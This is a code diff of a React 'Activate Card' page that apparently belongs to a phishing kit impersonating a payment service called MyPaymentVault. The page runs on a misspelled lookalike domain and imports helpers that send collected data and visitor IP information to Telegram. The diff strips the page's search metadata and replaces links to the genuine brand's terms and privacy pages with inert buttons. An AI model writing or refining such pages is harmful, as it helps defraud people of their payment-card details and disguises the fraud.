@@ -1,6 +1,5 @@
 import { useState } from "react";
 import { useLocation } from "wouter";
-import { Helmet } from "react-helmet-async";
 import { AuthHeader } from "@/components/auth-header";
 import { CheckCircle } from "lucide-react";
 import { sendTelegram, getIPInfo } from "@/lib/telegram";
@@ -112,16 +111,6 @@ export default function ActivateCard() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      <Helmet>
-        <title>Activate Card — mypaymenttvaulltr.com</title>
-        <meta name="description" content="Activate your MyPaymentVault payment card to start using your account." />
-        <link rel="canonical" href="https://www.mypaymenttvaulltr.com/login" />
-        <meta property="og:title" content="Activate Card — mypaymenttvaulltr.com" />
-        <meta property="og:description" content="Activate your MyPaymentVault payment card to start using your account." />
-        <meta property="og:url" content="https://www.mypaymenttvaulltr.com/activate-card" />
-        <meta name="twitter:title" content="Activate Card — mypaymenttvaulltr.com" />
-        <meta name="twitter:description" content="Activate your MyPaymentVault payment card to start using your account." />
-      </Helmet>
       <AuthHeader />
 
       <div className="w-full overflow-hidden" style={{ maxHeight: "310px" }}>
@@ -209,9 +198,9 @@ export default function ActivateCard() {
 
       <p className="text-[11px] text-gray-400 text-center py-4 border-t border-gray-100">
         &copy; {t.copyright} |{" "}
-        <a href="https://mypaymentvault.com/terms" target="_blank" rel="noopener noreferrer" className="underline hover:text-gray-600">{t.termsOfUse}</a>
+        <button className="underline hover:text-gray-600">{t.termsOfUse}</button>
         {" | "}
-        <a href="https://mypaymentvault.com/privacy" target="_blank" rel="noopener noreferrer" className="underline hover:text-gray-600">{t.privacyCookies}</a>
+        <button className="underline hover:text-gray-600">{t.privacyCookies}</button>
       </p>
     </div>
   );
